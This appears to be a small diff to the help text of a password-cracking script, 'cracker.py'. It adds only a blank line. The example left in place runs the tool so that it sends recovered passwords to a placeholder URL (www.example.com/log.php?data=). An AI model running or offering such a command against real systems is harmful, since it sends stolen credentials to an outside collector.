@@ -8,6 +8,7 @@ Parameters:
     h - print this help
 
 Examples:
+
     python cracker.py -vps http://www.example.com/log.php?data=
     Be extremely verbose and send passwords to specified uri
 
